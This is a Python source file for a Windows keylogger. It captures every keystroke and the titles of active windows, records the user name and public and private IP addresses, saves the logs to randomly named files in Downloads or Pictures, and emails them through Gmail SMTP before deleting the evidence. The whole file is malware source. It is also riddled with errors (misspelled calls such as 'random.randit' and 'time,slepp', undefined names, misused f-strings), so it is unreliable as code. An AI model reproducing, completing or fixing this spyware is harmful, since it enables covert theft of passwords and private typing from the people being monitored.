from pynput.keyboard import Key, Listener
import win32gui
import os
import time
import requests
import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import config

time = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
pblc_ip = requests.get('https://api.ipify.org/').text
prvt_ip = socket.gethostbyname(socket.gethostname())

msg = f('======[START OF LOGS]======\n >> Date&Time   : {time}\n >> User-Profile: {user}\n >> Public-IP   : {pblc_ip}\n >> Privat-IP   : {prvt_ip}\n\n')
log = []
log.append(msg)

prev_app = ''
del_file = []

def press(key):
	global prev_app

	app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
	if app == 'Cortana':
		app = 'Window Start Menu'
	else:
		pass

	if app != prev_app and app != '':
		log.append(f'[{time}] ~ {app}\n')
		prev_app = app
	else:
		pass

	sub_key = ['Key.enter', '[ENTER]\n', 'key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

	key = str(key).strip('\'')
	if key in sub_key:
		log.append(sub_key[sub_key.index(key)+1])
	else:
		log.append(key)

def write(count):
	a = os.path.expanduser('~') + '/Downloads/'
	b = os.path.expanduser('~') + '/Pictures/'
	#three = 'C:/'
	list = [a, b]

	flpt = random.choice(list)
	flnm = str(count) + 'I' + str(random.randit(1000000,9999999)) + '.txt'
	file = flpt + flnm
	del_files.append(file)

	with open(file, 'w') as fp:
		fp.write(''.join(log))
	print ('Written all good')

def send():
	count = 0
	adr = adress.frmAdres
	psw = adress.frmPswrd
	to = adr

	MIN = 10
	SECOND = 60
	#time.sleep(MIN * SECOND) # every 10 mins file/send log
	time,slepp(30) # for debuging ~ yes program works :)

	while True:
		if len(log) > 1:
			try:
				write(count)
				sbj = f('[{user}] ~ {count}')

				msg = MIMEMultipart()
				msg['From'] = adr
				msg['To'] = to
				msg['Subject'] = sbj
				bdy = 'testing'
				msg.attach(MIMEText(bdy, 'plain'))

				atcmn = open(del_file[0], 'rb')
				print ('attachment')

				filename = del_file[0].split('/')[2]
				p = MIMEBase('application', 'octect-stream')
				p.set_payload(atcmn).read()
				encoders.encode_base64(p)
				p.add_header('content-disposition', 'atcmn;filename='+str(filename))
				msg.attach(p)

				text = msg.as_string()
				print ('test msg.as_string')

				s = smtplib.SMTP('smtp.gmail.com',587)
				s.ehlo()
				s.stsrttls()
				print('starttls')
				s.ehlo()
				s.login(adr,psw)
				s.sendmai(adr,to,text)
				print ('Send mail')
				atcmn.close()
				s.close()

				os.remove(del_file[0])
				del log[1:]
				del del_file[0:]
				print ('Delete data/files')

				count += 1

			except Exception as errorString:
				print ('[!] send_logs // Error.. ~ %s' %(errorString))
				pass

if __name__== '__main__':
	T1 = threading.Thread(target=send_logs)
	T1.start()

	with Listener(on_press=on_press) as listener:
		listener.join()